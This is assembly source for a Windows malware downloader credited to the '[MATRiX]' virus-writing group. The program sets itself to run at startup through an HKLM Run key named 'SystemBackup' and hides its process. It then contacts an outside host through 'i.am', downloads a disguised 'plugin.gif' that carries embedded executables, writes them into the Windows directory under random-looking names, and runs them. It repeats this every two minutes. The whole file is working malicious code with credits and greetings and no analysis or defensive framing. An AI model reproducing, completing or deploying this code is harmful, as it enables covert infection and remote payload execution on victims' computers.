     .586p
     .model flat
     locals
     jumps

     ; KERNEL32.DLL

     extrn ExitProcess:proc
     extrn Sleep:proc
     extrn lstrlen:proc
     extrn lstrcat:proc
     extrn lstrcmpi:proc
     extrn GetModuleHandleA:proc
     extrn GetModuleFileNameA:proc
     extrn CopyFileA:proc
     extrn GetWindowsDirectoryA:proc
     extrn GetFileSize:proc
     extrn CloseHandle:proc
     extrn VirtualAlloc:proc
     extrn VirtualFree:proc
     extrn GetProcAddress:proc
     extrn GetTickCount:proc
     extrn CreateProcessA:proc
     extrn GetStartupInfoA:proc
     extrn DeleteFileA:proc
     extrn CreateFileA:proc
     extrn GetFileTime:proc
     extrn CreateFileMappingA:proc
     extrn MapViewOfFile:proc
     extrn CloseHandle:proc
     extrn UnmapViewOfFile:proc
     extrn SetEndOfFile:proc
     extrn SetFilePointer:proc
     extrn SetFileTime:proc

     ; WSOCK32.DLL

     extrn WSACleanup:proc
     extrn socket:proc
     extrn connect:proc
     extrn send:proc
     extrn recv:proc
     extrn WSAStartup:proc
     extrn WSAGetLastError:proc
     extrn gethostbyname:proc
     extrn closesocket:proc

     ; ADVAPI32.DLL

     extrn RegCreateKeyExA:proc
     extrn RegSetValueExA:proc
     extrn RegCloseKey:proc
     extrn RegSetValueExA:proc

     ; USER32.DLL

     extrn MessageBoxA:proc
     extrn EnumWindows:proc

     .code

start:

     mov eax, offset ourKey
     call registry

     cmp [regDisposition], 1
     jne rotina

     push 0
     call GetModuleHandleA

     push 260
     push offset cmd_buffer1
     push eax
     call GetModuleFileNameA

     mov eax,offset ourKey2
     call registry

     mov eax,offset cmd_buffer1
     mov ebx,offset ourKey3
     call setKey

     jmp rotina

no_way:

     push 0
     call ExitProcess

rotina:

     push [regResult]    ; Get the handle and close it
     call RegCloseKey    ; This isn't the first time
                         ; running into the system
     push 260
     push offset cmd_buffer0
     call GetWindowsDirectoryA

     push 0
     call GetModuleHandleA

     push 260
     mov esi,offset cmd_buffer1
     push esi
     push eax
     call GetModuleFileNameA
     lodsd

     call Hide

_4ever?:

     call pre
     mov ecx,10

used?:

     call pname
     call delete
     loop used?

     call internet

     test eax,eax
     jnz again?

     ; ecx = number of plugins to play

     call pre

play:

     call pname
     call create_it
     loop play

     push 0
     call ExitProcess

again?:

     push 60 * 2 * 1000  ; Wait 2 minutes
     call Sleep

     jmp short _4ever?

internet:

     call pre

     push offset cmd_buffer0
     push 101H
     call WSAStartup

     test eax,eax
     jz G0

     call WSAGetLastError

     ; Socket version ok ?

     cmp eax, 10092
     je no_way

     jmp down0

G0:

     mov [conc],offset iam
     call initconnect2

     test eax,eax
     jnz down1

     mov eax,8192
     call virtual_allo
     mov [iam_buffer], eax

     test eax,eax
     jz down2

     mov edi,offset cmd_buffer0
     mov esi,offset matr
     mov ebx,offset iam

     call line

     push edi
     mov esi,edi
     call lstrlen

     mov edi,eax
     call _send

     cmp eax,-1
     je down3

     mov esi,[iam_buffer]

iamrecv:

     call _recv

     inc eax
     jz iamerror
     dec eax
     add esi,eax

     test eax,eax
     jnz iamrecv

     jmp iamok

iamerror:

     call WSAGetLastError

     cmp eax,10035
     je iamrecv
     cmp eax,10038
     jne down3

iamok:

     mov eax,[iam_buffer]

     cmp [eax],'PTTH'
     jne down3

     add eax,8
     cmp [eax],'002 '
     jne down3

     ; reset the connection with http://i.am/,
     ; get our true host, connect again, cmd line
     ; for plugin.gif and send it.

     call process1

     test eax,eax
     jnz down3

     mov eax,8192
     call virtual_allo
     mov [plugimage],eax

     test eax,eax
     jz down3

     mov esi,eax
     call download

     test eax,eax
     jnz down4

     mov edi,[plugimage]
     mov ecx,8192

rloop:

     inc edi
     cmp [edi],'PLUG'
     je rloopok
     loop rloop
     jmp down4

rloopok:

     mov esi,[plugimage]
     mov ecx,[edi+4]
     sub edi,16
     xchg edi,esi
     rep movsb

     call plugin

     ; memory --> file

     mov eax,[plugimage]
     push eax
     mov eax,[eax+4]
     mov [flop],eax

     pop eax
     lea eax,[eax+24]
     mov [szop],eax

     mov eax,[plugimage1]
     mov [plugimage2],eax

down000001:

     call pname

     mov eax,[szop]
     mov eax,[eax]
     add [szop],4
     mov [filesize],eax

     call create
     mov edi,eax

     test eax,eax
     jz down5

     mov eax,'tnoC'
     mov esi,[plugimage2]
     mov ecx,[plugimage]
     mov ecx,[ecx+12]
     sub ecx,10
     call looplook

     cmp eax,-1
     je down5

     mov [plugimage2],esi
     mov eax,'epyT'
     call looplook

     cmp eax,-1
     je down5

     mov ecx,8192 - 10
     mov eax,0a0d0a0dh
     call looplook

     cmp eax,-1
     je down5

     cmp word ptr [esi+4],'ZM'
     jne down5
     add esi,4

     mov ecx,[filesize]
     mov [plugimage2],esi
     rep movsb

     call unmap

     dec [flop]
     cmp [flop],0
     ja down000001

     mov [status], 0

down5:

     mov ecx,[plugimage]
     mov eax,[ecx+4]
     mov [pnum],eax
     mov ecx,[ecx+12]
     mov eax,[plugimage1]
     call virtual_free

down4:

     mov eax,[plugimage]
     mov ecx,8192
     call virtual_free

down3:

     mov eax,[iam_buffer]
     mov ecx,8192
     call virtual_free

down2:

     push [xsocket]
     call closesocket

down1:

     call WSACleanup

down0:

     mov eax,[status]
     mov ecx,12345678h
     org $-4
pnum dd 0
     ret

looplook:

     push ecx

loopzz:

     inc esi
     cmp [esi],eax
     je looppeok
     loop loopzz
     mov eax,-1

looppeok:

     pop ecx
     ret

_recv:

     push 0
     push 4096
     push esi
     push [xsocket]
     call recv

     inc eax
     jnz recvOK

     call WSAGetLastError

     cmp eax, 10035
     je _recv

     xor eax,eax

recvOK:

     dec eax
     ret

_send:

     push 0
     push edi
     push esi
     push [xsocket]
     call send

     inc eax
     jnz send_ok

     ; Get the error code status

     call WSAGetLastError

     ; WSAEWOULDBLOCK ?

     cmp eax, 10035
     je _send

unknowerror:

     xor eax,eax

send_ok:

     dec eax
     ret

randomize:

     mov al, '\'
     stosb
     mov ecx,4

rnd_name:

     call random
     stosb

rnd_name2:

     call random
     cmp byte ptr [edi-1],al
     je rnd_name2
     stosb     
     loop rnd_name
     mov eax,'EXE.'
     stosd
     xor al,al
     stosb
     ret

random:

     push 3
     call Sleep

     call GetTickCount
     cmp [rnd], 1
     je random2
     xchg al,ah
     mov [rnd], 1
     jmp short random3

random2:

     xor al,ah
     mov [rnd], 0

random3:
     
     cmp al,'A'
     jb random
     cmp al,'z'
     ja random
     cmp al, '\'
     je random
     ret

registry:

     push offset regDisposition
     push offset regResult
     push 0         ; default security descriptor
     push 0F003FH   ; desired security access = KEY_ALL_ACCESS
                    ; This is a combination of 6 keys
     push 0         ; This key is not volatile
     push 0
     push 0
     push eax       ; address of subkey name
     push 80000002h ; HKEY_LOCAL_MACHINE address
     call RegCreateKeyExA
     ret

setKey:

     push 1
     push eax  ;    App. name
     push 1
     push 0
     push ebx  ;    Key name     
     push [regResult]
     call RegSetValueExA
     ret

download:

     call _recv
     cmp eax,-1
     je dowret
     test eax,eax
     jz dowret
     add esi,eax
     jmp short download

dowret:

     ret

plugin:

     ; have to process the information
     ; and download the plugins

     mov eax,[plugimage]
     mov eax,[eax+12]
     call virtual_allo

     mov [plugimage1], eax
     mov [plugimage2], eax

     test eax,eax
     jz plugfuck1

     mov ecx,[plugimage]
     mov esi,ecx
     mov ecx,[ecx+4]
     add esi,[esi+8]

     ; here:
     ; ecx = how many plugins to download
     ; esi = offset for array of plugins

plugloop:

     mov eax,[plugimage]
     add eax,[eax]

     mov [conc],eax
     call initconnect1

     test eax,eax
     jnz plugfuck

     mov edi,offset cmd_buffer1
     push ecx

     push esi
     call lstrlen

     push esi
     inc eax
     mov ecx,eax
     rep movsb
     pop esi

     ; Update esi to the next file

     add esi,eax
     push esi

     ; host em ebx

     mov ebx,[plugimage]
     add ebx,[ebx]

     mov esi,offset cmd_buffer1
     mov edi,offset cmd_buffer0

     call line

     ; The command line was
     ; done, just loop and
     ; download now

     mov esi,offset cmd_buffer0
     push esi
     call lstrlen

     mov edi,eax
     call _send

     cmp eax,-1
     je plugfuck3

     mov esi,[plugimage2]
     call download

     test eax,eax
     jnz plugfuck3

     ; Update buffer

     mov [plugimage2], esi

     pop esi
     pop ecx
     loop plugloop
     xor eax,eax
     ret

plugfuck3:

     add esp,8

plugfuck:

;     mov ecx,[plugimage]
;     mov ecx,[ecx+12]
;     mov eax,[plugimage1]
;     call virtual_free

plugfuck1:

     xor eax, eax
     ret

initconnect1:

     pushad
     push [xsocket]
     call closesocket
     jmp short initconnect2+1

initconnect2:

     pushad
     push 00H           ; particular protocol to be used
     push 01H           ; type specification for the new socket
     push 02H           ; PF_INET (format currently supported)
     call socket

     mov [xsocket],eax
     inc eax
     jz pro004

     ; Get site's IP number

     push [conc]
     call gethostbyname

     test eax,eax
     jz fail2

     mov eax,[eax+4]
     mov eax,[eax+4]
     mov [host],eax

reconnect:

     push 16
     push offset xhost
     push [xsocket]
     call connect

     test eax,eax
     jz pro005

     call WSAGetLastError

     ; We are alredy connected

     cmp eax, 10056
     je pro005

     ; Connection refused ? try again, plz

     cmp eax,10061
     jne fail2

     push 10 * 1000
     call Sleep

     jmp reconnect

fail2:

     push [xsocket]
     call closesocket
     jmp pro004

pname:

     pushad
     mov edi,offset cmd_buffer0
     push 260
     push edi
     call GetWindowsDirectoryA
     add edi,eax
     mov al,'\'
     stosb
     mov eax,'xtm~'
     stosd
     mov al,byte ptr [namex]
     stosb
     mov eax,'exe.'
     stosd
     xor al,al
     stosb
     inc byte ptr [namex]
     popad
     ret

     namex db 30h

process1:

     ; do a command line to get plugin.gif
     ; with the info. at iam_buffer

     pushad
     mov ecx,8192
     mov eax,'=LRU'
     mov esi,[iam_buffer]

pro000:

     inc esi
     cmp [esi],eax
     je pro001
     loop pro000
     popad
     mov eax,-1
     ret

pro001:

     add esi,11
     mov edi,offset cmd_buffer0

     ; just copy our true host

pro002:

     lodsb
     stosb
     cmp al,'/'
     jne pro002

     mov byte ptr [edi-1],0
     pushad

     mov [conc],offset cmd_buffer0
     call initconnect1

     cmp eax,-1
     je pro004

     popad
     dec esi

pro003:

     lodsb
     stosb
     cmp al,'"'
     jne pro003
     dec edi
     mov al,'/'
     stosb
     mov eax,'gulp'
     stosd
     mov eax,'g.ni'
     stosd
     mov ax,'fi'
     stosw
     xor al,al
     stosb

     mov esi,offset cmd_buffer0
     push esi
     call lstrlen

     mov ebx,esi
     add esi,eax
     inc esi
     mov edi,offset cmd_buffer1

     call line

     push edi
     mov esi,edi
     call lstrlen

     mov edi,eax
     call _send

     cmp eax,-1
     jne pro005

pro004:

     popad
     mov eax,-1
     ret

pro005:

     popad
     xor eax,eax
     ret

line:

     ; esi = offset para o q vem depois de get
     ; ebx = o host
     ; edi = offset pro buffer

     pushad
     mov eax,' TEG'
     stosd

xpz01:

     lodsb
     stosb
     cmp al,0
     jne xpz01
     mov byte ptr [edi-1],20h
     mov eax,'PTTH'
     stosd
     mov eax,'1.1/'
     stosd
     mov ax,0a0dh
     stosw
     mov eax,'tsoH'
     stosd
     mov ax,' :'
     stosw
     mov esi,ebx

xpz02:

     lodsb
     stosb
     cmp al,0
     jne xpz02
     dec edi
     mov ax,0a0dh
     stosw
     mov esi,offset user
     mov ecx,usersz+1
     rep movsb
     popad
     ret

virtual_allo:

     push 40H
     push 00103000H
     push eax
     push 0
     call VirtualAlloc
     ret

virtual_free:

     push ecx
     push 4000H
     push ecx
     push eax
     call VirtualFree
     pop ecx
     ret

Hide:

     push offset kernel32
     call GetModuleHandleA

     push offset Register
     push eax
     call GetProcAddress

     test eax,eax
     jnz winOK
     ret

     ; Here we have to find a way to
     ; hide our process by undocumented
     ; method

winOK:

     push 1
     push 0
     call eax
     ret

create_it:

     pushad
     push offset startup
     call GetStartupInfoA

     push offset informe
     push offset startup
     push 0
     push 0
     push 67108928h
     push 0
     push 0
     push 0
     push offset cmd_buffer0
     push 0
     call CreateProcessA
     popad
     ret

delete:

     pushad
     push offset cmd_buffer0
     call DeleteFileA
     popad
     ret

pre:

     mov [status],-1
     mov [szop],0
     mov byte ptr [namex],30h
     mov [pnum],0
     ret

open:

     push 0
     push 0
     push 3
     jmp short opecre

create:

     push 0
     push 0
     push 2

opecre:

     push 0
     push 1
     push 80000000h or 40000000h
     push offset cmd_buffer0
     call CreateFileA

     mov [handle],eax
     inc eax
     jz ebc
     dec eax

     ; Salve info. about the file

     mov eax,offset time
     push eax
     add eax,8
     push eax
     add eax,8
     push eax
     push [handle]
     call GetFileTime

     push 0
     push [filesize]
     push 0
     push 4
     push 0
     push [handle]
     call CreateFileMappingA

     mov [handle2],eax
     test eax,eax
     jz eac

     push [filesize]
     push 0
     push 0
     push 2
     push [handle2]
     call MapViewOfFile

     ; Return address in eax

     mov [mem_addr],eax 
     test eax,eax
     jz cbm
     ret

unmap:

     push [mem_addr]
     call UnmapViewOfFile
cbm:

     push [handle2]
     call CloseHandle

     push 0
     push 0
     push [filesize]
     push [handle]
     call SetFilePointer

     push [handle]
     call SetEndOfFile

eac:

     mov eax,offset time
     push eax
     add eax,8
     push eax
     add eax,8
     push eax
     push [handle]
     call SetFileTime

     push [handle]
     call CloseHandle

ebc:

     xor eax,eax
     ret

.data?

   cmd_buffer0 db 260 dup (0)
   cmd_buffer1 db 260 dup (0)
     informe   dd 5 dup (0)
     startup   dd 20 dup (0)
     mem_addr  dd 0
     filesize  dd 0
     handle    dd 0
     handle2   dd 0
     time      dd 0,0,0,0,0,0
     regDisposition dd 0
    iam_buffer dd 0
     conc      dd 0
     szop      dd 0
     flop      dd 0
     regResult dd 0
     rnd       dd 0
     plugimage dd 0
    plugimage1 dd 0
    plugimage2 dd 0
     status    dd 0
     plsize    dd 0
     xsocket   dd 0
     ownmem    dd 0

.data

     ourKey    db 'Software\[MATRiX]', 0
     iam       db 'i.am',0
     matr      db '/[MATRIX]/',0
     user      db 'User-Agent: GetRight/3.2',13,10
               db 'Accept: *.*, */*',13,10,13,10
     usersz    equ $ - user
               db 0
     ourKey2   db 'Software\Microsoft\Windows\CurrentVersion\Run', 0
     ourKey3   db 'SystemBackup', 0
     kernel32  db 'KERNEL32', 0
     Register  db 'RegisterServiceProcess',0
     xhost     dd 050000002h       ; Port number = 80 = http
     host      dd 0                ; Host in hex.
               dd 0
     FILESIZEX equ 5120
copyright db 'Software provide by [MATRiX] team:',0dh,0ah
          db 'Ultras, Mort, Nbk, Tgr, Del_Armg0, Anaktos',0dh,0ah
          db 'Greetz:',0d,0ah
          db 'Vecna 4 source codes and ideas,',0dh,0ah,0
     EOF:

end start
